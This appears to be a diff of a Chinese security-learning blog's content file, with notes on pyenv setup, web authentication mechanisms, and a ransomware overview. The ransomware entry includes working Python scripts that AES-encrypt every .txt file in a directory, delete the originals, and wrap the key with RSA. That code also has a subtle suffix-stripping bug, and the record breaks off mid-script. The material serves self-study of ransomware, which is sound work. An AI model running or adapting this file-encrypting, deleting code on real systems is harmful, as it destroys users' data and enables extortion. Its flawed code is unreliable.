-<h1 id="bashrc环境配置"><a href="#bashrc环境配置" class="headerlink" title=".bashrc环境配置"></a>.bashrc环境配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;export PATH=&quot;$HOME/.pyenv/bin:$PATH&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init --path)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z ]# echo &#x27;eval &quot;$(pyenv virtualenv-init -)&quot;&#x27; &gt;&gt; ~/.bashrc</span><br></pre></td></tr></table></figure>
-<h1 id="error"><a href="#error" class="headerlink" title="error"></a>error</h1><p>更新出错显示没有virtualenv-init</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# source /root/.bashrc</span><br><span class="line">pyenv: no such command `virtualenv-init&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这个命令可以将下载的插件直接放入pyenv的plugin插件文件夹下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# git clone https://github.com/pyenv/pyenv-virtualenv.git $(pyenv root)/plugins/pyenv-virtualenv</span><br><span class="line">Cloning into &#x27;/root/.pyenv/plugins/pyenv-virtualenv&#x27;...</span><br><span class="line">remote: Enumerating objects: 2301, done.</span><br><span class="line">再次更新成功</span><br></pre></td></tr></table></figure>
-<h1 id="本地缓存加快python包解压缩"><a href="#本地缓存加快python包解压缩" class="headerlink" title="本地缓存加快python包解压缩"></a>本地缓存加快python包解压缩</h1><p>创建cache文件夹缓存下载好的python压缩包</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[python@iZuf6fkxk1equ6kjtxh1u3Z .pyenv]$ mkdir cache</span><br></pre></td></tr></table></figure>
-<p>直接使用pyenv下载环境速度很慢，推荐本地主机提前下载好python版本后scp上传服务器<br>（之前没用密钥认证可以使用kali，后续使用密钥认证后使用xshell的本地终端上传，但每次需要认证ssh密钥，有点麻烦）</p>
-<h1 id="scp文件上传"><a href="#scp文件上传" class="headerlink" title="scp文件上传"></a>scp文件上传</h1><p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>
-<h1 id="查看配置"><a href="#查看配置" class="headerlink" title="查看配置"></a>查看配置</h1><p>确认pyenv和virtualenv-init是否配置完成</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which virtualenv-init</span><br><span class="line">/usr/bin/which: no virtualenv-init in (/root/.pyenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/plugins/pyenv-virtualenv/shims:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/root/.pyenv/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin)</span><br><span class="line"></span><br><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# which pyenv</span><br><span class="line">pyenv ()</span><br><span class="line">&#123; </span><br><span class="line">    local command;</span><br><span class="line">    command=&quot;$&#123;1:-&#125;&quot;;</span><br><span class="line">    if [ &quot;$#&quot; -gt 0 ]; then</span><br><span class="line">        shift;</span><br><span class="line">    fi;</span><br><span class="line">    case &quot;$command&quot; in </span><br><span class="line">        activate | deactivate | rehash | shell)</span><br><span class="line">            eval &quot;$(pyenv &quot;sh-$command&quot; &quot;$@&quot;)&quot;</span><br><span class="line">        ;;</span><br><span class="line">        *)</span><br><span class="line">            command pyenv &quot;$command&quot; &quot;$@&quot;</span><br><span class="line">        ;;</span><br><span class="line">    esac</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="安装编译环境和依赖工具"><a href="#安装编译环境和依赖工具" class="headerlink" title="安装编译环境和依赖工具"></a>安装编译环境和依赖工具</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z plugins]# sudo yum -y groupinstall &quot;Development Tools&quot;</span><br><span class="line">/usr/lib/python3.6/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 3.6 is no longer supported by the Python core team. Therefore, support for it is deprecated in cryptography. The next release of cryptography will remove support for Python 3.6.</span><br><span class="line">  from cryptography import x509</span><br><span class="line"></span><br><span class="line">Failed loading plugin &quot;spacewalk&quot;: module &#x27;lib&#x27; has no attribute &#x27;X509_V_FLAG_CB_ISSUER_CHECK&#x27;</span><br><span class="line">Last metadata expiration check: 2:54:19 ago on Wed 10 Jul 2024 05:25:19 PM CST.</span><br><span class="line">Dependencies resolved.</span><br></pre></td></tr></table></figure>
-
-<h1 id="安装python环境"><a href="#安装python环境" class="headerlink" title="安装python环境"></a>安装python环境</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv install 3.10.0</span><br><span class="line">WARNING: Please make sure you remove any previous custom paths from your /root/.pydistutils.cfg file.</span><br><span class="line">Installing Python-3.10.0...</span><br><span class="line">patching file aclocal.m4</span><br><span class="line">patching file configure</span><br><span class="line">Hunk #5 succeeded at 10537 (offset -15 lines).</span><br><span class="line">patching file Misc/NEWS.d/next/Build/2021-10-11-16-27-38.bpo-45405.iSfdW5.rst</span><br><span class="line">patching file configure</span><br><span class="line">patching file configure.ac</span><br><span class="line">Installed Python-3.10.0 to /root/.pyenv/versions/3.10.0</span><br></pre></td></tr></table></figure>
-<h1 id="设置为全局"><a href="#设置为全局" class="headerlink" title="设置为全局"></a>设置为全局</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# pyenv global 3.10.0</span><br></pre></td></tr></table></figure>
-<h1 id="查看版本"><a href="#查看版本" class="headerlink" title="查看版本"></a>查看版本</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@iZuf6fkxk1equ6kjtxh1u3Z cache]# python -V</span><br><span class="line">Python 3.10.0</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>pyenv</tag>
+        <tag>文件传输</tag>
       </tags>
   </entry>
   <entry>
@@ -797,15 +685,15 @@
       </tags>
   </entry>
   <entry>
-    <title>scp简单使用举例</title>
-    <url>/posts/b7234643.html</url>
-    <content><![CDATA[<p>scp（secure copy） 需要上传的文件  上传到的用户（比如root账户或其他创建的账户）@服务器IP:目标文件夹</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~kali/Desktop/tools/py-env]</span><br><span class="line">└─# scp Python-3.10.0.tgz python@xxx.xxx.xxx.xxx:~/.pyenv/cache</span><br></pre></td></tr></table></figure>]]></content>
+    <title>sqli-labs靶场练习</title>
+    <url>/posts/d642dfa0.html</url>
+    <content><![CDATA[<p>虽然之前通关过一次但已历史久远，未来如果有机会再来一次的话我一定截图</p>
+]]></content>
       <categories>
-        <category>命令行工具</category>
+        <category>Web安全</category>
       </categories>
       <tags>
-        <tag>文件传输</tag>
+        <tag>sql-inject</tag>
       </tags>
   </entry>
   <entry>
@@ -920,25 +808,6 @@
       </tags>
   </entry>
   <entry>
-    <title>web认证机制与攻击方式</title>
-    <url>/posts/65c9aba7.html</url>
-    <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">https://websec.readthedocs.io/zh/latest/auth/index.html</a></p>
-<h1 id="http-basic-auth-http-基础授权-早期"><a href="#http-basic-auth-http-基础授权-早期" class="headerlink" title="http basic auth (http 基础授权 早期)"></a>http basic auth (http 基础授权 早期)</h1><p>访问url请求头需包含用户名和密码<br>若未收到http basic auth 返回401，并返回basic值的请求头www-authenticate及参数realm<br>如apache后台访问会跳一个要求输入账密的弹窗，抓包发现请求头的authentication: basic 一串密文，这串密文为base64加密<br>摘: <a href="https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4">https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4</a></p>
-<h1 id="MFA-Multi-Factor-Authentication-多因子认证"><a href="#MFA-Multi-Factor-Authentication-多因子认证" class="headerlink" title="MFA (Multi-Factor Authentication 多因子认证)"></a>MFA (Multi-Factor Authentication 多因子认证)</h1><p>即多种方式对用户身份进行验证。<br>在web端的多因子认证能大大提高系统安全，但在部分系统中，不同因子的认证可能互不相关，或因为代码逻辑缺陷导致存在漏洞。<br>摘: <a href="https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor">https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor</a></p>
-<h1 id="SSO-Single-Sign-On"><a href="#SSO-Single-Sign-On" class="headerlink" title="SSO (Single Sign On)"></a>SSO (Single Sign On)</h1><p>一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统<br>摘: <a href="https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&u_asig=1a0c399a17276105611338740e012d">https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&amp;u_asig=1a0c399a17276105611338740e012d</a></p>
-<h1 id="JWT令牌-Json-Web-Token"><a href="#JWT令牌-Json-Web-Token" class="headerlink" title="JWT令牌 (Json Web Token)"></a>JWT令牌 (Json Web Token)</h1><p>常用于分布式站点的SSO场景<br>摘: <a href="https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/">https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/</a></p>
-<h1 id="Oauth2"><a href="#Oauth2" class="headerlink" title="Oauth2"></a>Oauth2</h1><p>OAuth2.0 是一个被广泛使用的授权框架。能满足网站和WEB程序对另一个应用程序上用户账户数据的有限访问。允许用户在不公开登陆账号密码等凭据的情况下，授权第三方访问权限，实现不同应用间的账户认证。<br>摘: <a href="https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&u_asig=1a0c384b17276185334966303e0049">https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&amp;u_asig=1a0c384b17276185334966303e0049</a></p>
-<h1 id="SAML-Security-Assertion-Markup-Language-安全断言标记语言"><a href="#SAML-Security-Assertion-Markup-Language-安全断言标记语言" class="headerlink" title="SAML (Security Assertion Markup Language 安全断言标记语言)"></a>SAML (Security Assertion Markup Language 安全断言标记语言)</h1><p>XML格式的语言，使用XML格式交互，来完成SSO的功能<br>摘: <a href="https://www.freebuf.com/articles/system/361055">https://www.freebuf.com/articles/system/361055</a>.<br>(小声逼逼: 最近Gitlab有这个洞，exp未公开)</p>
-<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>内网渗透避不开的认证<br>摘: <a href="https://xz.aliyun.com/t/14534">https://xz.aliyun.com/t/14534</a></p>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>认证机制与攻击</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulntarget-N勒索病毒靶场练习</title>
     <url>/posts/4fea4d13.html</url>
     <content><![CDATA[<h1 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h1><p><a href="https://blog.csdn.net/csdnmmd/article/details/139614037">https://blog.csdn.net/csdnmmd/article/details/139614037</a><br> vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：<br>    01、客户在阿里云部署的业务环境<br>    02、今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据<br>    03、客户发现其中部分重要文件被加密为.vulntarget结尾<br>随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。<br>具体要求如下：<br>    01、分析攻击事件是如何发生的，请给出攻击画像<br>    02、解密勒索<br>    03、恢复原来的index.jsp页面，恢复正常的web服务</p>
@@ -993,6 +862,25 @@
       </tags>
   </entry>
   <entry>
+    <title>web认证机制与攻击方式</title>
+    <url>/posts/65c9aba7.html</url>
+    <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">https://websec.readthedocs.io/zh/latest/auth/index.html</a></p>
+<h1 id="http-basic-auth-http-基础授权-早期"><a href="#http-basic-auth-http-基础授权-早期" class="headerlink" title="http basic auth (http 基础授权 早期)"></a>http basic auth (http 基础授权 早期)</h1><p>访问url请求头需包含用户名和密码<br>若未收到http basic auth 返回401，并返回basic值的请求头www-authenticate及参数realm<br>如apache后台访问会跳一个要求输入账密的弹窗，抓包发现请求头的authentication: basic 一串密文，这串密文为base64加密<br>摘: <a href="https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4">https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4</a></p>
+<h1 id="MFA-Multi-Factor-Authentication-多因子认证"><a href="#MFA-Multi-Factor-Authentication-多因子认证" class="headerlink" title="MFA (Multi-Factor Authentication 多因子认证)"></a>MFA (Multi-Factor Authentication 多因子认证)</h1><p>即多种方式对用户身份进行验证。<br>在web端的多因子认证能大大提高系统安全，但在部分系统中，不同因子的认证可能互不相关，或因为代码逻辑缺陷导致存在漏洞。<br>摘: <a href="https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor">https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor</a></p>
+<h1 id="SSO-Single-Sign-On"><a href="#SSO-Single-Sign-On" class="headerlink" title="SSO (Single Sign On)"></a>SSO (Single Sign On)</h1><p>一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统<br>摘: <a href="https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&u_asig=1a0c399a17276105611338740e012d">https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&amp;u_asig=1a0c399a17276105611338740e012d</a></p>
+<h1 id="JWT令牌-Json-Web-Token"><a href="#JWT令牌-Json-Web-Token" class="headerlink" title="JWT令牌 (Json Web Token)"></a>JWT令牌 (Json Web Token)</h1><p>常用于分布式站点的SSO场景<br>摘: <a href="https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/">https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/</a></p>
+<h1 id="Oauth2"><a href="#Oauth2" class="headerlink" title="Oauth2"></a>Oauth2</h1><p>OAuth2.0 是一个被广泛使用的授权框架。能满足网站和WEB程序对另一个应用程序上用户账户数据的有限访问。允许用户在不公开登陆账号密码等凭据的情况下，授权第三方访问权限，实现不同应用间的账户认证。<br>摘: <a href="https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&u_asig=1a0c384b17276185334966303e0049">https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&amp;u_asig=1a0c384b17276185334966303e0049</a></p>
+<h1 id="SAML-Security-Assertion-Markup-Language-安全断言标记语言"><a href="#SAML-Security-Assertion-Markup-Language-安全断言标记语言" class="headerlink" title="SAML (Security Assertion Markup Language 安全断言标记语言)"></a>SAML (Security Assertion Markup Language 安全断言标记语言)</h1><p>XML格式的语言，使用XML格式交互，来完成SSO的功能<br>摘: <a href="https://www.freebuf.com/articles/system/361055">https://www.freebuf.com/articles/system/361055</a>.<br>(小声逼逼: 最近Gitlab有这个洞，exp未公开)</p>
+<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>内网渗透避不开的认证<br>摘: <a href="https://xz.aliyun.com/t/14534">https://xz.aliyun.com/t/14534</a></p>
+]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>认证机制与攻击</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>xxe漏洞及原理</title>
     <url>/posts/e69865a1.html</url>
     <content><![CDATA[<p>这个洞总是学了又忘，第四次了。<br>摘: <a href="https://blog.csdn.net/elephantxiang/article/details/113812331">pikachu XXE (XML外部实体注入)（皮卡丘漏洞平台通关系列）_仙女象的博客-CSDN博客</a><br>摘: <a href="https://lalajun.github.io/2019/12/03/WEB-XXE/">WEB-XXE (lalajun.github.io)</a><br>摘: <a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br>摘: <a href="dtd%EF%BC%88%E5%85%83%E7%B4%A0%E5%AE%9A%E4%B9%89%E5%92%8C%E5%B1%9E%E6%80%A7%E5%AE%9A%E4%B9%89%EF%BC%89">https://blog.csdn.net/m0_54546762&#x2F;article&#x2F;details&#x2F;119181068#:~:text&#x3D;二 、元素定义 1引入DTD约束 <!DOCTYPE ROOT []> 2添加元素定义 &lt;!ELEMENT,<!ELEMENT element-name (#PCDATA)> (文本元素) <!ELEMENT element-name (e1,e2)> (混合元素)</a></p>
@@ -1039,6 +927,34 @@
       </categories>
       <tags>
         <tag>内网穿透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>勒索病毒概述与常见攻击手法</title>
+    <url>/posts/770d9e62.html</url>
+    <content><![CDATA[<h1 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h1><p>勒索病毒（Ransomware）是一种恶意软件，它通过加密目标系统上的文件，进而威胁受害者支付赎金才能解锁文件。其工作原理通常分为以下几个阶段：<br>入侵与感染：勒索病毒通过各种手段渗透到目标计算机，并获得执行的权限。<br>加密：一旦病毒在系统中获得执行权限，它会加密文件，使文件无法打开或使用。<br>勒索：加密后，攻击者会使主机显示勒索信息，要求受害者支付赎金才能获取解密密钥。<br>赎金支付：在支付赎金后，受害者可能获得解密密钥（但也不一定能成功解密），也有可能完全无法恢复数据。</p>
+<h1 id="常见勒索病毒"><a href="#常见勒索病毒" class="headerlink" title="常见勒索病毒"></a>常见勒索病毒</h1><p>1.WannaCry<br>WannaCry是最著名的勒索病毒之一，2017年广泛传播，利用Windows SMB漏洞（MS17-010）进行传播。它对全球数以万计的计算机造成了影响<br>2.Petya&#x2F;NotPetya<br>Petya&#x2F;NotPetya是另外一款著名的勒索病毒，它通过利用Windows SMB协议漏洞传播，且感染后会加密硬盘的主引导记录（MBR）<br>它的一个显著特点是，不仅加密文件，还可能破坏计算机的引导区域，使得计算机无法正常启动<br>3.Ryuk<br>Ryuk是一种定向攻击型勒索病毒，主要攻击大型企业和政府机构，通常通过钓鱼邮件传播，攻击者会先通过其他方式进入网络，然后部署Ryuk来加密数据<br>4.Locky<br>Locky也是一种非常流行的勒索病毒，它通常通过钓鱼邮件传播，邮件中包含一个伪装成发票或其他文档的恶意附件<br>5.Cerber<br>Cerber是另一款常见的勒索病毒，通常通过邮件附件传播，具有多个版本，可以绕过一些防病毒软件的检测</p>
+<h1 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h1><p>1.电子邮件钓鱼攻击<br>电子邮件是勒索病毒最常见的传播途径之一。攻击者发送伪装成正常邮件的附件或链接，诱使用户点击<br>附件可能是一个带有恶意宏的文档，或者是一个可执行文件<br>点击后，恶意文件会下载并执行，开始勒索病毒的传播</p>
+<p>2.恶意网站与广告<br>索病毒可以通过恶意网站或通过网页广告传播，通常会利用浏览器漏洞（如Flash、Java等）执行恶意代码<br>用户只需访问包含恶意广告或漏洞利用的页面，勒索病毒就可能通过“驱动下载”进行传播<br>3.漏洞利用<br>索病毒也会利用操作系统或软件的漏洞进行传播。例如，攻击者可以通过利用Windows SMB（Server Message Block）漏洞（如WannaCry病毒所做的）来传播勒索病毒<br>病毒可以直接通过网络连接攻击目标主机，绕过防火墙、杀毒软件等安全措施<br>4.网络钓鱼与社工<br>攻击者通过社交工程欺骗受害者下载和执行病毒。例如，假冒系统更新、伪装成免费软件<br>5.rdp暴力破解<br>勒索病毒可以通过暴力破解Windows RDP服务的密码进入目标主机，上传勒索病毒感染并加密文件<br>6.物理接入<br>勒索病毒可以通过USB驱动器传播，攻击者将病毒拷贝到U盘中，用户插入U盘后，病毒通过自动播放传播</p>
+<h1 id="常见加密"><a href="#常见加密" class="headerlink" title="常见加密"></a>常见加密</h1><h2 id="AES对称加密"><a href="#AES对称加密" class="headerlink" title="AES对称加密"></a>AES对称加密</h2><p>勒索病毒通常使用对称加密（如AES）对目标文件进行加密。对称加密算法的特点是加密和解密使用同一个密钥。<br>恶意软件会生成一个随机密钥（称为“会话密钥”），然后使用目标机器的公开密钥加密这个密钥。这样，即使加密数据被拦截，攻击者也无法解密。</p>
+<h2 id="RSA非对称加密"><a href="#RSA非对称加密" class="headerlink" title="RSA非对称加密"></a>RSA非对称加密</h2><p>在某些勒索病毒中，攻击者会使用非对称加密（例如RSA）加密文件。非对称加密需要一对密钥：公钥和私钥。<br>受害者通过公钥加密数据，但只有攻击者拥有解密用的私钥。</p>
+<h1 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h1><p>本次测试使用aes密钥对目录下txt后缀文件进行加密，使用rsa公钥对aes密钥加密获得aes加密密钥，加密后缀为lock<br>模拟攻击者上传aes加密密钥。用户若想解密文件，则需要向攻击者取得rsa的私钥对aes加密密钥进行解密，然后通过aes密钥对加密文件解密</p>
+<h2 id="生成AES密钥"><a href="#生成AES密钥" class="headerlink" title="生成AES密钥"></a>生成AES密钥</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># aes_key.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_aes_key</span>():</span><br><span class="line">    <span class="comment"># 生成 128 位 AES 密钥（16 字节）</span></span><br><span class="line">    aes_key = os.urandom(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;AES 密钥: <span class="subst">&#123;aes_key.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存密钥到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(aes_key)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES 密钥已保存到 aes_key.bin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_aes_key()</span><br></pre></td></tr></table></figure>
+
+<h2 id="aes加密文件"><a href="#aes加密文件" class="headerlink" title="aes加密文件"></a>aes加密文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_file</span>(<span class="params">file_path, aes_key</span>):</span><br><span class="line">    <span class="comment"># 创建 AES 加密器</span></span><br><span class="line">    cipher = AES.new(aes_key, AES.MODE_CBC)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 读取文件内容</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file_data = file.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 填充数据并加密</span></span><br><span class="line">    encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 创建加密后的文件路径，并修改后缀为 .lock</span></span><br><span class="line">    encrypted_file_path = file_path.rstrip(<span class="string">&#x27;.txt&#x27;</span>) + <span class="string">&#x27;.lock&#x27;</span>  <span class="comment"># 替换 .txt 后缀为 .lock</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存加密后的数据到文件</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(encrypted_file_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> encrypted_file:</span><br><span class="line">        encrypted_file.write(cipher.iv + encrypted_data)  <span class="comment"># 包括 IV 作为文件的前缀</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 删除原文件</span></span><br><span class="line">    os.remove(file_path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 输出加密成功信息</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;文件 <span class="subst">&#123;file_path&#125;</span> 已加密并保存为 <span class="subst">&#123;encrypted_file_path&#125;</span>，原文件已删除。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_txt_files</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 遍历当前目录下的所有 .txt 文件并加密</span></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> os.listdir():</span><br><span class="line">        <span class="keyword">if</span> file_name.endswith(<span class="string">&#x27;.txt&#x27;</span>):</span><br><span class="line">            encrypt_file(file_name, aes_key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 读取保存的 AES 密钥（假设密钥是保存为 aes_key.bin）</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;aes_key.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        aes_key = f.read()</span><br><span class="line">    </span><br><span class="line">    encrypt_txt_files(aes_key)</span><br></pre></td></tr></table></figure>
+
+<h2 id="rsa公私钥生成"><a href="#rsa公私钥生成" class="headerlink" title="rsa公私钥生成"></a>rsa公私钥生成</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsa_keys.py</span></span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_rsa_keys</span>():</span><br><span class="line">    <span class="comment"># 生成 2048 位的 RSA 密钥对</span></span><br><span class="line">    public_key, private_key = rsa.newkeys(<span class="number">2048</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存公钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_public_key.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> pub_file:</span><br><span class="line">        pub_file.write(public_key.save_pkcs1())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存私钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_private_key.pem&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> priv_file:</span><br><span class="line">        priv_file.write(private_key.save_pkcs1())</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;RSA 公钥和私钥已生成并保存为 rsa_public_key.pem 和 rsa_private_key.pem&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_rsa_keys()</span><br></pre></td></tr></table></figure>
+
+<h2 id="rsa公钥加密aes"><a href="#rsa公钥加密aes" class="headerlink" title="rsa公钥加密aes"></a>rsa公钥加密aes</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rsa_encrypt_aes_key.py</span></span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_aes_key_with_rsa</span>(<span class="params">aes_key</span>):</span><br><span class="line">    <span class="comment"># 读取 RSA 公钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;rsa_public_key.pem&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> pub_file:</span><br><span class="line">        pub_key_data = pub_file.read()</span><br><span class="line">        public_key = rsa.PublicKey.load_pkcs1(pub_key_data)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用 RSA 公钥加密 AES 密钥</span></span><br><span class="line">    encrypted_aes_key = rsa.encrypt(aes_key, public_key)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 保存加密后的 AES 密钥</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted_aes_key.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span 